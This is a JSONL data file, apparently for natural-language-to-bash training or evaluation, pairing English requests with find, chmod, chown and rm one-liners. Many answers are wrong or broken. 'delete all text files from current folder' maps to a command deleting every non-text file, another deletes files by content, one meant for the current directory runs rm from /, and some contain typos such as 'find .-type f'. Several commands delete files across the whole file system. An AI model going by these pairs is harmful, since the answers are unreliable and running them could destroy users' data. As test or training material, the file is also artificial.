{"input": "change the extension of all the files in the current folder to html excluding those html files and those which are present in another disk partition", "answer": "find . -xtype f \\! -iname *.html   -exec mv -iv \"{}\"  \"{}.html\"  \\;"}
{"input": "change the group of all directories in the current folder", "answer": "find . -type d -exec chgrp usergroup {} \\;"}
{"input": "change the group of all regular/normal files in the current directory", "answer": "find . -type f -exec chgrp usergroup {} \\;"}
{"input": "change the group of all the files in the file system which belong to the group with the gid 999", "answer": "find / -group 999 -exec chgrp NEWGROUP {} \\;"}
{"input": "change the group of all the files in the folder /u/netinst/ to staff", "answer": "find /u/netinst -print | xargs chgrp staff"}
{"input": "change the group of all the files which belong to the user edwarda to pubs", "answer": "find / -user edwarda -exec chgrp pubs \"{}\" \\;"}
{"input": "change the group to \"new_group\" and permissions to 770 for all the files in the current folder", "answer": "find . -name \"*\" -exec chgrp -v new_group '{}' \\; -exec chmod -v 770 '{}' \\;"}
{"input": "change the owner and group of all the directories in the current folder and /home/admin/data/ to admin & admin", "answer": "find . /home/admin/data/ -type d -exec chown admin.admin {} \\;"}
{"input": "change the owner and group of all the files in the folder  /usr/lpp/FINANCIALS", "answer": "find /usr/lpp/FINANCIALS -print | xargs chown roger.staff"}
{"input": "change the owner and group of all the normal/regular files in the current folder and /home/admin/data/ to admin & admin", "answer": "find . /home/admin/data/ -type f -exec chown admin.admin {} \\;"}
{"input": "change the owner of all the files in folder /u/netinst to netinst", "answer": "find /u/netinst -print | xargs chown netinst"}
{"input": "change the owner of all the files in the current directory", "answer": "find . -exec chown myuser:a-common-group-name {} +"}
{"input": "change the owner of all the files in the file system which belong to the user with the uid 999", "answer": "find / -user 999 -exec chown NEWUSER {} \\;"}
{"input": "change the owner of all the regular/normal files which belong to the root user to \"tom\" in the current folder", "answer": "find .-type f -user root -exec chown tom {} \\;"}
{"input": "change the owner of the files which belong to the group 1000 to username and modify only the symbolic link not the originally pointed file", "answer": "find -gid 1000 -exec chown -h :username {} \\;"}
{"input": "change the ownership of all directories in the current folder", "answer": "find . -type d -exec chown username {} \\;"}
{"input": "change the ownership of all regular/normal files in the current directory", "answer": "find . -type f -exec chown username {} \\;"}
{"input": "change the ownership of all regular/normal files in the current directory after users confirmation", "answer": "find . -type f -ok chown username {} \\;"}
{"input": "change the ownership of all regular/normal files in the current directory(print0 is used to handle all the files which have spaces or new lines in their names)", "answer": "find . -type f -print0 | xargs -0 chown username"}
{"input": "change the ownership of all the files in the file system from edwarda to earnestc", "answer": "find / -user edwarda -exec chown earnestc \"{}\" \\;"}
{"input": "change the permission of all php files in current folder", "answer": "find . -name \"*.php\" -exec chmod 755 {} \\;"}
{"input": "change the permission of all php files in current folder. Plus symbol at the end is used to give multiple files as input to the chmod command", "answer": "find . -name \"*.php\" -exec chmod 755 {} +"}
{"input": "change the permission of all the directories to 755 in the current folder", "answer": "find -type d -exec chmod 755 {} \\;"}
{"input": "change the permission of all the files in the current directory to 664 and change the permission of all the directories  in the current folder to 775", "answer": "find . \\( -type f -exec sudo chmod 664 \"{}\" \\; \\) , \\( -type d -exec sudo chmod 775 \"{}\" \\; \\)"}
{"input": "change the permission of all the normal/regular files to 644 in the current folder", "answer": "find -type f -exec chmod 644 {} \\;"}
{"input": "change the permission of all the php files in the folder /var/www/ to 700", "answer": "find /var/www/ -type f -iname \"*.php\" -exec chmod 700 {} \\;"}
{"input": "change the permission of all the regular files in the folder /home to 700", "answer": "find /home -type f -perm 0777 -print -exec chmod 700 {} \\;"}
{"input": "change the permission of all the regular/normal files in the current folder from 777 to 755", "answer": "find . -type f -perm 777 -exec chmod 755 {} \\;"}
{"input": "change the permission of all the rpm files in the entire file system to 755", "answer": "find / -name *.rpm -exec chmod 755 '{}' \\;"}
{"input": "change the permissions of al the directories in the current folder", "answer": "sudo find . -type d -exec chmod 755 {} +"}
{"input": "change the permissions of all regular/normal files in the current directory", "answer": "find . -type f -exec chmod 664 {} \\;"}
{"input": "change the permissions of all regular/normal files in the current directory, print0 is used for handling files with newlines in their file name", "answer": "find . -type f -print0 | xargs -0 chmod 664"}
{"input": "change the permissions of all regular/normal files in the file system", "answer": "chmod 640 `find ./ -type f -print`"}
{"input": "change the permissions of all the directories in the current folder", "answer": "chmod 751 `find ./ -type d -print`"}
{"input": "change the permissions of all the directories in the current folder, print0 is used for handling files with newlines in their file name", "answer": "find . -type d -print0 | xargs -0 chmod 2775"}
{"input": "change the permissions of all the directories in the folder \"/path/to/someDirectory\" to 755", "answer": "sudo find /path/to/someDirectory -type d -print0 | xargs -0 sudo chmod 755"}
{"input": "change the permissions of all the files ending with \"fits\" in the folder \"/store/01\"", "answer": "find /store/01 -name \"*.fits\" -exec chmod -x+r {} \\; \\"}
{"input": "change the permissions of all the files ending with \"fits\" in the folder \"/store/01\" and save the output file names to a log file", "answer": "find /store/01 -name \"*.fits\" -exec chmod -x+r {} \\; -exec ls -l {} \\; | tee ALL_FILES.LOG"}
{"input": "change the permissions of all the normal files in a directory", "answer": "find /path/to/dir/ -type f -print0 | xargs -0 chmod 644"}
{"input": "change the permissions of all the regular files in the current folder", "answer": "find . -type f -exec chmod 500 {} ';'"}
{"input": "change the permissions of all the regular/normal files in the current folder", "answer": "chmod 640 `find ./ -type f -print`"}
{"input": "change the permissions of all the regular/normal files in the folder \"/path/to/someDirectory\" to 644", "answer": "sudo find /path/to/someDirectory -type f -print0 | xargs -0 sudo chmod 644"}
{"input": "change the permissions of all the regular/normal files to 664 in the current folder", "answer": "find . -type f -exec chmod 664 {} \\;"}
{"input": "change the permissions of mp3 files in the folder /var/ftp/mp3 to 644", "answer": "find /var/ftp/mp3 -name '*.mp3' -type f -exec chmod 644 {} \\;"}
{"input": "change the permissions of the directories from 777 to 755 in the folder \"/var/www/html\"", "answer": "find /var/www/html -type d -perm 777 -print -exec chmod 755 {} \\;"}
{"input": "change the word \"GHBAG\" to \"stream-agg\" in all the file names in current folder which have the word \"-GHBAG-\" in their name", "answer": "find . -name '*-GHBAG-*' -exec rename 's/GHBAG/stream-agg/' {} +"}
{"input": "change user and group of the file /usr/bin/aws to user amzadm and group root", "answer": "chown amzadm.root  /usr/bin/aws"}
{"input": "check if myfile has 0644 permissions", "answer": "find myfile -perm 0644 -print"}
{"input": "check if there any files from the .git folder after excluding it using the prune command", "answer": "find . -path ./.git -prune -o -print -a \\( -type f -o -type l -o -type d \\) | grep '.git'"}
{"input": "check the type of files in the folder /usr/bin", "answer": "find /usr/bin | xargs file"}
{"input": "compare each C header file in or below the current directory with the file /tmp/master", "answer": "find . -name '*.h' -execdir diff -u '{}' /tmp/master ';'"}
{"input": "compress all the non-compressed  files in the current directory", "answer": "find . \\! -name \"*.Z\" -exec compress -f {} \\;"}
{"input": "concatenates file1.txt, file2.txt, and file3.txt with the filenames printed at the beginning of file contents", "answer": "head -n99999999 file1.txt file2.txt file3.txt"}
{"input": "convert epoch second timestamp to date", "answer": "date -d @1278999698 +'%Y-%m-%d %H:%M:%S'"}
{"input": "cope *.mp3 files to /tmp/MusicFiles", "answer": "find . -type f -name \"*.mp3\" -exec cp {} /tmp/MusicFiles \\;"}
{"input": "create a backup of all the files in the current folder excluding those that are present in the .snapshot sub directory and excluding the swap files (files ending with  ~)", "answer": "find . -name .snapshot -prune -o \\( \\! -name *~ -print0 \\) | cpio -pmd0 /dest-dir"}
{"input": "create a backup of all the files in the current folder to the floppy and save the file list in the file /tmp/BACKUP.LOG", "answer": "find . -cpio /dev/fd0 -print | tee /tmp/BACKUP.LOG"}
{"input": "create a backup of all the files in the home folder on a partition and save the log to a file", "answer": "find /home -depth -print | cpio -ov -0 /dev/rmt0 | tee -a tape.log"}
{"input": "create a backup of all the files which have been modified in the last 48 hours", "answer": "find source/directory -ctime -2 | cpio -pvdm /my/dest/directory"}
{"input": "create a cpio archive of the entire contents the current directory while preserving the permissions, times, and ownership of every file and sub-directory", "answer": "find . -depth -print | cpio -o -O /target/directory"}
{"input": "create a gzip of all the files in the current folder excluding the already gzipped files", "answer": "gzip `find . \\! -name '*.gz' -print`"}
{"input": "create a gzip of all the files in the current folder excluding the already gzipped files", "answer": "find . \\! -name \"*.gz\" -exec gzip {} \\;"}
{"input": "create a hard link as directory named \"new_hard_link\" to the directory \"existing_dir\" as root", "answer": "sudo  ln  -d  existing_dir  new_hard_link"}
{"input": "create a link to all the html or htm files in the current folder which have been changed in the last 30*24 hours", "answer": "find \\( -name \"*.htm\" -o -name \"*.html\" \\) -a -ctime -30 -exec ln {} /var/www/obsolete \\;"}
{"input": "create a md5sum for all the instances of the file MyCProgram.c in current folder", "answer": "find -iname \"MyCProgram.c\" -exec md5sum {} \\;"}
{"input": "create a soft link of the files in the folder /media/movies which have been modified in the last 30 days", "answer": "find /media/Movies -type f -mtime -30 -exec ln -s {} /media/Movies/New/ \\;"}
{"input": "create a tar ball of all pdf files in current folder", "answer": "find . -name *.pdf | xargs tar czvf /root/Desktop/evidence/pdf.tar"}
{"input": "create a tar ball of all the jpg and png images in the current folder", "answer": "find . \\( -iname \"*.png\" -o -iname \"*.jpg\" \\) -print -exec tar -rf images.tar {} \\;"}
{"input": "create a tar file of all the songs on my system that have been modified in the last 180 days (which is essentially six months)", "answer": "find . -name -type f '*.mp3' -mtime -180 -print0 | xargs -0 tar rvf music.tar"}
{"input": "create a tar of all png & jpg images in the current folder", "answer": "find . \\( -iname \"*.png\" -o -iname \"*.jpg\" \\) -print -exec tar -rf images.tar {} \\;"}
{"input": "create a tar.gz compress file with all the jpg files in the entire file system", "answer": "find / -name *.jpg -type f -print | xargs tar -cvzf images.tar.gz"}
{"input": "create a zip of all the files in the current folder which are bigger than 100Kb and do not go more than 2 levels during search", "answer": "find . -maxdepth 2 -size +100000 -exec bzip2 {} \\;"}
{"input": "create a zip of log files in the current directory which have not been accessed in the last 3 days (-p is for parallel processing for a 4 cpu machine)", "answer": "find . -name '*.log' -mtime +3 -print0 | xargs -0 -P 4 bzip2"}
{"input": "create a zip of log files in the current directory which have not been accessed in the last 3 days (-p is for parallel processing for a 4 cpu machine, -n is for maximum work units)", "answer": "find . -name '*.log' -mtime +3 -print0 | xargs -0 -n 500 -P 4 bzip2"}
{"input": "create archive \"backup.tar.gz\" from /path/to/catalog", "answer": "tar czfP backup.tar.gz /path/to/catalog"}
{"input": "create backup of all the text files  present in the current folder", "answer": "find -name \"*.txt\" cp {} {}.bkup \\;"}
{"input": "create directory /data/db", "answer": "sudo mkdir /data/db"}
{"input": "create directory /etc/cron.5minute", "answer": "mkdir /etc/cron.5minute"}
{"input": "create directory backup", "answer": "mkdir backup"}
{"input": "create symbolic links in current directory to all files located in directory \"/original\" and have filename extension \".processname\"", "answer": "find /original -name '*.processme' -exec echo ln -s '{}' . \\;"}
{"input": "create symbolic links in directory \"/usr/local/symlinks \" to all files located in directiry \"incoming\" and that have been modified earlier then 5 days and owned by user \"nr\"", "answer": "find /incoming -mtime -5 -user nr -exec ln -s '{}' /usr/local/symlinks ';'"}
{"input": "create symbolic links in directory \"/your/dest/dir/\" to all files located in \"/your/source/dir/\" and have filename extension \"txt.mrg\"", "answer": "find /your/source/dir/ -iname '*.txt.mrg' -exec ln -s '{}' /your/dest/dir/ \\;"}
{"input": "create the compressed tar archive images.tar.gz containing all jpg files found under /", "answer": "find / -name *.jpg -type f -print | xargs tar -cvzf images.tar.gz"}
{"input": "delete a hard link and create a symbolic link to file named \"$link\"", "answer": "ln -sf \"$(readlink -f \"$link\")\" \"$link\""}
{"input": "delete all empty files in the current directory ( empty file = size 0 bytes )", "answer": "find . -empty -exec rm '{}' \\;"}
{"input": "delete all files in $DIR that have not been accessed in at least 5 days", "answer": "find \"$DIR\" -type f -atime +5 -exec rm {} \\;"}
{"input": "delete all files in the home directory which ahve the name core in them", "answer": "find ~/ -name 'core*' -exec rm {} \\;"}
{"input": "delete all files that have the extension \"bam\" in current directory", "answer": "find . -name \"*.bam\" | xargs rm"}
{"input": "delete all instances of the file \"bad\" if its size is 0 bytes", "answer": "find . -name bad -empty -delete"}
{"input": "delete all text files from current folder", "answer": "find . -type f ! -iname \"*.txt\" -delete"}
{"input": "delete all text files in the entire file system", "answer": "find / -type f -name \"*.txt\" -print | xargs rm"}
{"input": "delete all text files in the home folder after user confirmation", "answer": "find $HOME/. -name \"*.txt\" -ok rm {} \\;"}
{"input": "delete all the \".bak\" or swap files in kat folder", "answer": "find kat -type f \\( -name \"*~\" -p -name \"*.bak\" \\) -delete"}
{"input": "delete all the \".doc\" files in the current folder", "answer": "find . -name '*.doc' -exec rm \"{}\" \\;"}
{"input": "delete all the \"wmv\" \"wma\" files in the currnet folder,", "answer": "find . \\( -name '*.wmv' -o -name '*.wma' \\) -exec rm {} \\;"}
{"input": "delete all the backup files in current directory", "answer": "find . -name \"*.bak\" -delete"}
{"input": "delete all the broken symbolic links from the folder /usr/ports/packages", "answer": "find -L /usr/ports/packages -type l -exec rm -- {} +"}
{"input": "delete all the core files in the folder /prog which are bigger than 1KB", "answer": "find /prog -type f -size +1000 -print -name core -exec rm {} \\;"}
{"input": "delete all the empty directories in the current folder", "answer": "find . -type d -empty -exec rmdir {} \\;"}
{"input": "delete all the empty files in the current directory only if they are ok and the user has the permission to delete them", "answer": "find . -empty -ok rm {}\\;"}
{"input": "delete all the empty files(files with size 0 bytes) in the current folder", "answer": "find . -empty -delete -print"}
{"input": "delete all the files ending with \"~\" in current folder", "answer": "find -name '*~' -delete"}
{"input": "delete all the files in the current folder", "answer": "find . -delete"}
{"input": "delete all the files in the current folder  which do not belong to any user", "answer": "find / -nouser -exec rm {}\\;"}
{"input": "delete all the files in the current folder which are bigger than 1KB", "answer": "find . -size +1024 ?print|xargs -i rm \\;"}
{"input": "delete all the files in the current folder which do not belong to any user", "answer": "find . -nouser | xargs rm"}
{"input": "delete all the files in the current folder which end with \".bak\" or \".backup\" and which have not been accessed in the last 30 days", "answer": "find . ( -name '*.bak' -o -name *.backup ) -type f -atime +30 -exec rm '{}' ;"}
{"input": "delete all the files in the current folder which have been modified in the last 14*24 hours", "answer": "find . -mtime -14 -print|xargs -i rm \\;"}
{"input": "delete all the files in the file system which belong to the user edwarda", "answer": "find / -user edwarda -exec rm \"{}\" \\;"}
{"input": "delete all the files in the file system which belong to the user edwarda after user confirmation", "answer": "find / -user edwarda -ok rm \"{}\" \\;"}
{"input": "delete all the files which start with \"Tes\" in the current folder", "answer": "find . -type f -name \"Tes*\" -exec rm {} \\;"}
{"input": "delete all the log files in the current folder", "answer": "find -name '*.log' -delete"}
{"input": "delete all the log files which have not been modified in the last 5 days after user confirmation", "answer": "find . \u2014 name \"*.LOG\" \u2014 mtime +5 -ok rm {} \\;"}
{"input": "delete all the mp3 files in the current folder", "answer": "find . -type f -name \"*.mp3\" -exec rm -f {} \\;"}
{"input": "delete all the mp3 files in the home folder", "answer": "find /home/ -exec grep -l 'mp3' {} \\; | xargs rm"}
{"input": "delete all the mp4 files in the folder /home which are bigger than 10MB", "answer": "find /home -type f -name *.mp4 -size +10M -exec rm {} \\;"}
{"input": "delete all the normal files in the current directory whcih have the word \"gui\" in their content", "answer": "find / -type f -print0 | xargs -0 grep -liwZ GUI | xargs -0 rm -f"}
{"input": "delete all the php files in the folder /var/www", "answer": "find /var/www/*.php -type f -exec rm {} \\;"}
{"input": "delete all the regular files in the temp folder which have not been changed in the last 15*24 hours", "answer": "find /tmp/ -ctime +15 -type f -exec rm {} \\;"}
{"input": "delete all the regular files in the temp folder which have not been modified in the last 24 hours", "answer": "find /tmp/ -type f -mtime +1 -delete"}
{"input": "delete all the regular files in the temp folder which have not been modified in the last 24 hours + at the end gives bulk input to the rm command", "answer": "find /tmp/ -type f -mtime +1 -exec rm {} +"}
{"input": "delete all the text files from the current folder after user confirmation", "answer": "find . -name \"*.txt\" -ok rm {} \\;"}
{"input": "delete all the text files in the current folder", "answer": "find . -type f -name \"*.txt\" -delete"}
{"input": "delete all the text files in the current folder", "answer": "find . -type f -name \"*.txt\" -exec rm -f {} \\;"}
{"input": "delete all the text files starting with the name \"oldStuff\" in the file system", "answer": "find / -name \"oldStuff*.txt\" -delete"}
{"input": "delete all the tmp files ( files with the extension tmp ) in the /tmp folder", "answer": "find /tmp -name \"*.tmp\" | xargs rm"}
{"input": "delete all the tmp files ( files with the extension tmp ) in the /tmp folder. Print0 is used to display all those files which have newline in their names or files whose name is only spaces", "answer": "find /tmp -name \"*.tmp\" -print0 | xargs -0 rm   find /tmp -name \"*.tmp\" -print0 | xargs -0 rm"}
{"input": "delete all the trace files (\".trc\") which have not been been accessed in the last 30*24 hours", "answer": "find /dirpath \\( -name \\*.trc -a -mtime +30 \\) -exec rm {} \\;"}
{"input": "delete recursively, without prompting, any files or directories under the current directory that case insensitively match the filename \".svn\"", "answer": "find . -iname .svn -exec rm -rf {} \\;"}
{"input": "delete what was typed in the command line and run \"pwd\" when button \"\\e[24~\"", "answer": "bind '\"\\e[24~\":\"\\C-k \\C-upwd\\n\"'"}
{"input": "dispaly a long listig of all the files in the current folder which are bigger than 100KB", "answer": "find . -size +100000 -ls"}
{"input": "dispaly a long listing of all the files in the current folder which have been modified in the last 14 days", "answer": "find . -mtime -14 -ls"}
{"input": "display a list of all files in the folder passed as argument to a script", "answer": "find $@ -ls"}
{"input": "display a list of all java or jsp files in the current folders", "answer": "find . \\( -name '*jsp' -o -name '*java' \\) -type f -ls"}
{"input": "display a list of all regular/normal files in the current folder", "answer": "find . -type f -ls"}
{"input": "display a list of all the files  in the home folder which have been modified today", "answer": "find ~ -type f -mtime 0 -ls"}
{"input": "display a list of all the files in the file system which do not belong to any group and search only in jfs and jfs2 file systems", "answer": "find / -nogroup \\( -fstype jfs -o -fstype jfs2 \\) -ls"}
{"input": "display a list of all the files in the file system which do not belong to any user and search only in jfs and jfs2 file systems", "answer": "find / -nouser \\( -fstype jfs -o -fstype jfs2 \\) -ls"}
{"input": "display a list of all the normal/regular files in the file system ,excluding the folder proc which have the suid or sgid bit set", "answer": "find / -path /proc -prune -o -type f -perm +6000 -ls"}
{"input": "display a long ilsting of all the files in the file system which are bigger than 1KB and which have not been modified in the last 30*24 hours", "answer": "find / -size +1000 -mtime +30  -exec ls -l {} \\;"}
{"input": "display a long list of all regular/normal files in the file system which belong to the root and with suid bit set", "answer": "find / -type f -user root -perm -4000 -exec ls -l {} \\;"}
{"input": "display a long list of all the directories which have files ending with \".todo\"", "answer": "find \"$STORAGEFOLDER\" -name .todo -printf '%h\\n' | uniq | xargs ls -l"}
{"input": "display a long list of all the files in the directory \"/mydir\" which have not been modified in the last 20*24 hours or which have not been accessed in the last 40*24 hours", "answer": "find /mydir \\(-mtime +20 -o -atime +40\\) -exec ls -l {} \\;"}
{"input": "display a long list of all the files that are bigger than 10KB in current folder", "answer": "find . -size +10k -exec ls -l {} \\;"}
{"input": "display a long list of all the jpg files in the home folder", "answer": "find ~ -iname '*.jpg' -exec ls {} \\;"}
{"input": "display a long list of all the jpg files in the home folder(plus at the end is used to give bulk data as input)", "answer": "find ~ -iname '*.jpg' -exec ls {} +"}
{"input": "display a long list of the files in the current folder which have the word fuddel in all the files in the current folder and then search for the word fiddel in the previously matched files", "answer": "find -exec grep -q fuddel {} \";\" -exec grep -q fiddel {} \";\" -ls"}
{"input": "display all directories in a folder", "answer": "find /etc -type d -print"}
{"input": "display all directories in current folder", "answer": "find . -type d -print0"}
{"input": "display all directories in current folder and do not search in sub directories", "answer": "find . -maxdepth 1 -mindepth 1 -type d"}
{"input": "display all directories in current folder excluding those that are present in .git folder", "answer": "find . -iregex '.*/.git/.*' -prune -o -type d -name 'CVS'"}
{"input": "display all directories in the folder \"$ORIG_DIR\"", "answer": "find \"$ORIG_DIR\" -name \"*\" -type d"}
{"input": "display all directories which have not been accessed in the last 24*3 hours", "answer": "find -type d -and -atime +3"}
{"input": "display all empty files in the current folder", "answer": "find . -size 0k"}
{"input": "display all file in the folder /dir/to/search except \".c\" files", "answer": "find /dir/to/search/ -not -name \"*.c\" -print"}
{"input": "display all file in the home folder except \".c\" files", "answer": "find $HOME -not -iname \"*.c\" -print"}
{"input": "display all file names in current folder", "answer": "find . -printf '%p '"}
{"input": "display all files  expect directories in the current folder", "answer": "find . ! \u2014 type d -print"}
{"input": "display all files ending with \".ext\" in current folder and append the file contents of list.txt and sort them based on name and display only uniq items", "answer": "find . -name \\*.ext | cat - list.txt | sort | uniq -u"}
{"input": "display all files ending with \"ini\" in current folder", "answer": "find . -type f -name '*.ini'"}
{"input": "display all files in current folder", "answer": "find ."}
{"input": "display all files in current folder and follow the symbolic links and display the pointed file", "answer": "find -L ."}
{"input": "display all files in current folder ending with \"~\" or \"#\" using regular expression", "answer": "find -regex \"^.*~$\\|^.*#$\""}
{"input": "display all files in current folder excluding current folder (.)", "answer": "find . \\! -name '.'"}
{"input": "display all files in current folder excluding text files", "answer": "find . ! -name \"*.txt\""}
{"input": "display all files in current folder excluding those that have the word \"git\" in their name and display files that have git in their path names", "answer": "find . ! -name '*git*' | grep git"}
{"input": "display all files in current folder in sorted order of depth", "answer": "find folder1/ -type f -printf \"%d\\t%p\\n\" | sort -n | sed -e \"s|[0-9]*\\t||\""}
{"input": "display all files in current folder using regular expression", "answer": "find -regex \"$rx\""}
{"input": "display all files in current folder which are bigger than 1 MB", "answer": "find . -size +1M"}
{"input": "display all files in current folder which have been modified in the last 60 minutes", "answer": "find -mmin 60"}
{"input": "display all files in current folder which have not been modified in the last 60 minutes", "answer": "find -mmin +60"}
{"input": "display all files in current folder with NULL separating each file", "answer": "find . -print0"}
{"input": "display all files in the current directory excluding those that are present in the directories whose name starts with \"efence\" and do not search in the sub directories", "answer": "find * -maxdepth 0 -name \"efence*\" -prune -o -print"}
{"input": "display all files in the current folder", "answer": "find ."}
{"input": "display all files in the current folder ($@ contains the variables passed as argument to the function)", "answer": "find . -iname \"*$@*\" -or -iname \".*$@*\""}
{"input": "display all files in the current folder after pruning those in the current folder ( dot is the output of this command )", "answer": "find . -prune -print"}
{"input": "display all files in the current folder along with their last access timestamps", "answer": "find . -printf \"%h/%f : dernier acc\u00e8s le %Ac\\n\""}
{"input": "display all files in the current folder along with their last accessed timestamps", "answer": "find . -printf \"%h/%f : dernier acc\u00e8s le %AA %Ad %AB %AY \u00e0 %AH:%AM:%AS\\n\""}
{"input": "display all files in the current folder and do not search in the sub directories", "answer": "find . -maxdepth 0"}
{"input": "display all files in the current folder expect text files", "answer": "find . -name \"*.txt\" -prune -o -print"}
{"input": "display all files in the current folder that have been modified in the last 24 hours whose name has only 1 letter", "answer": "find . -name \\? -mtime -1"}
{"input": "display all files in the current folder which are not empty", "answer": "find . ! -size 0k"}
{"input": "display all files in the current folder which do not belong to the user john", "answer": "find . ! -user john"}
{"input": "display all files in the current folder which do not match the regular expression", "answer": "find . -not -regex \".*test.*\""}
{"input": "display all files in the current folder which end with extension \"myfile\" followed by one digit or two digits", "answer": "find . -\\( -name \"myfile[0-9][0-9]\" -o -name \"myfile[0-9]\" \\)"}
{"input": "display all files in the current folder which end with extension \"myfile\" followed by two digits", "answer": "find . -regex '.*myfile[0-9][0-9]?'"}
{"input": "display all files in the current folder which start with met", "answer": "find -name met*"}
{"input": "display all files in the current folder with the name test excluding those that are present folder test", "answer": "find . -name test -prune -o -print"}
{"input": "display all files in the entire file system excluding the directories /proc,/sys,/dev and those files which are writable and which are not symbolic links and which are not sockets and which do not have the sticky bit set", "answer": "find / -noleaf -wholename '/proc' -prune -o -wholename '/sys' -prune -o -wholename '/dev' -prune -o -perm -2 ! -type l  ! -type s ! \\( -type d -perm -1000 \\) -print"}
{"input": "display all files in the entire file system excluding those that are in the transfer directory", "answer": "find / -name /transfer -prune -o -print"}
{"input": "display all files in the file system which are bigger than 50MB and having size \"filename\" in them", "answer": "find / -size +50M -iname \"filename\""}
{"input": "display all files in the folder /usr and its sub directory(do not search beyond the sub directory)", "answer": "find /usr -maxdepth 1 -print"}
{"input": "display all files in the folder /usr/src excluding those ending with \",v\"", "answer": "find /usr/src ! \\( -name '*,v' -o -name '.*,v' \\) '{}' \\; -print"}
{"input": "display all files in the folder bar only in the path /foo/bar/myfile (no output is generated)", "answer": "find bar -path /foo/bar/myfile -print"}
{"input": "display all files which have been modified between two dates in current folder", "answer": "find . -type f -newermt \"2014-01-01\" ! -newermt \"2014-06-01\""}
{"input": "display all hidden files in the current folder", "answer": "find . -type f -name \".*\""}
{"input": "display all html files  in  current folder", "answer": "find -name \"*.htm\" -print"}
{"input": "display all instances of \"foo.cpp\" file in the current folder which are not in the sub directory tree \".svn\"", "answer": "find . -name 'foo.cpp' '!' -path '.svn'"}
{"input": "display all instances of the .profile file in the entire file system", "answer": "find / -name .profile -print"}
{"input": "display all jpg files in the current folder", "answer": "find -iname \"*.jpg\""}
{"input": "display all mp3 files in the file system which have not been accessed in the last 24 hours", "answer": "find / -name '*.mp3' -atime +01 -type f"}
{"input": "display all non empty directories in current folder", "answer": "find . \\! -empty -type d"}
{"input": "display all normal / regular files in current folder in reverse order", "answer": "find . -type f | tac"}
{"input": "display all normal/regular files in a folder", "answer": "find /home/the_peasant -type f"}
{"input": "display all normal/regular files in current  folder", "answer": "find . -type f"}
{"input": "display all normal/regular files in current directory", "answer": "find . -type f"}
{"input": "display all normal/regular files in current folder", "answer": "find . -type f"}
{"input": "display all normal/regular files in current folder in sorted order", "answer": "find . -type f print0 | sort -r"}
{"input": "display all normal/regular files in current folder which have readable permission", "answer": "find . -type f -readable"}
{"input": "display all normal/regular files or directories in the folder \"$ORIG_DIR\"", "answer": "find \"$ORIG_DIR\" -name \"*\" -type d -o -name \"*\" -type f"}
{"input": "display all pdf files in the current folder", "answer": "find . -name *.pdf"}
{"input": "display all php,xml and phtml files in current folder", "answer": "find . -name '*.php' -o -name '*.xml' -o -name '*.phtml'"}
{"input": "display all regular files in current folder excluding search in the directories that are ending with \"git,svn\"", "answer": "find . \\( -type d -regex '^.*/\\.\\(git\\|svn\\)$' -prune -false \\) -o -type f -print0"}
{"input": "display all regular files in current folder which have spaces in their name", "answer": "find -type f -name \"* *\""}
{"input": "display all regular files in the folder image-folder", "answer": "find image-folder/ -type f"}
{"input": "display all regular/normal files in current folder", "answer": "find . -type f"}
{"input": "display all regular/normal files in temp folder and display the filename along with file size", "answer": "find tmp -type f -printf \"f %s %p\\n\""}
{"input": "display all regular/normal files in the current folder ending with the word ummy", "answer": "find -type f -name *ummy"}
{"input": "display all regular/normal files in the current folder with the name dummy", "answer": "find -type f -name dummy"}
{"input": "display all regular/normal files in the folder \"dir\" and display the filename along with file size", "answer": "find dir -type f -printf \"f %s %p\\n\""}
{"input": "display all regular/normal files in the folder /Users/david/Desktop/", "answer": "find /Users/david/Desktop/-type f"}
{"input": "display all scala files in the directory \"src/main\"", "answer": "find . -path \"*src/main*\" -type f -iname \"*\\.scala*\""}
{"input": "display all shell scripts in current folder", "answer": "find . -name \"*.sh\""}
{"input": "display all soft links in current folder", "answer": "find . -type l"}
{"input": "display all sqlite files in the current directory along with their timestamp", "answer": "find ./ -name \"*.sqlite\" -printf '%Tc %p\\n'"}
{"input": "display all symbolic links in current folder", "answer": "find . -lname \"*\""}
{"input": "display all symbolic links in the folder \"myfiles\"", "answer": "find /myfiles -type l"}
{"input": "display all symbolic links in the folder \"myfiles\" and follow them", "answer": "find -L /myfiles"}
{"input": "display all text files in a folder", "answer": "find $target -type f -iname \"*.txt\""}
{"input": "display all text files in current folder", "answer": "find . -name \"*.txt\""}
{"input": "display all text files in the folder /home/you which have been modified in the last 60*24 hours(case insensitive search)", "answer": "find /home/you -iname \"*.txt\" -mtime -60 -print"}
{"input": "display all text files in the folder /tmp/1", "answer": "find \"/tmp/1\" -iname \"*.txt\""}
{"input": "display all text files in the folder /tmp/1 excluding those which do not have spaces in their names", "answer": "find /tmp/1 -iname '*.txt' -not -iname '[0-9A-Za-z]*.txt'"}
{"input": "display all text files in the folder /user/directory which have been modified in today", "answer": "find /user/directory/* -name \"*txt\" -mtime 0 -type f"}
{"input": "display all text, mpg, jpg files  in the folder /Users/david/Desktop", "answer": "find /Users/david/Desktop -type f \\( -name '*.txt' -o -name '*.mpg' -o -name '*.jpg' \\)"}
{"input": "display all the \".c\" files in the current folder excluding those that are present in all the sub directories", "answer": "find . \\( ! -name . -prune \\) -name \"*.c\" -print"}
{"input": "display all the \".c\" files in the current folder excluding those that are present in the .svn sub folder", "answer": "find .  -name .svn -prune -o -name \"*.c\" -print"}
{"input": "display all the \".c\" files which have been modified in the last 10 minutes", "answer": "find /home/david -amin -10 -name '*.c'"}
{"input": "display all the \".mov\" files in the current folder", "answer": "find . -name \"*.mov\""}
{"input": "display all the \".mov\" video files in the current folder in the format filename and folder path", "answer": "find . -iname \"*.mov\" -printf \"%p %f\\n\""}
{"input": "display all the \".sh\" files in the current folder", "answer": "find -name *.sh"}
{"input": "display all the \"C\" files in the current folder", "answer": "find . -name \"*.c\""}
{"input": "display all the .sh scripts and perl files in the current folder", "answer": "find . -type f \\( -iname \"*.sh\" -or -iname \"*.pl\" \\)"}
{"input": "display all the C files or Python files in the folder \"euler\"", "answer": "find euler/ -iname \"*.c*\" -exec echo {} \\; -or -iname \"*.py\" -exec echo {} \\;"}
{"input": "display all the c files and the header files in the path /some/dir and do not search in sub directories", "answer": "find /some/dir -maxdepth 1 \\( -name '*.c' -o -name '*.h' \\) -print"}
{"input": "display all the configuration files in \"/etc\" folder along with their last access and modified timestamps", "answer": "find /etc -name \"*.conf\" -printf \"%f accessed %AF %Ar, modified %TF %Tr\\n\""}
{"input": "display all the configuration files in the current folder which are in the current tree structure", "answer": "find .  -path '*/*config'"}
{"input": "display all the configuration files in the etc folder", "answer": "find /etc -name '*.conf'"}
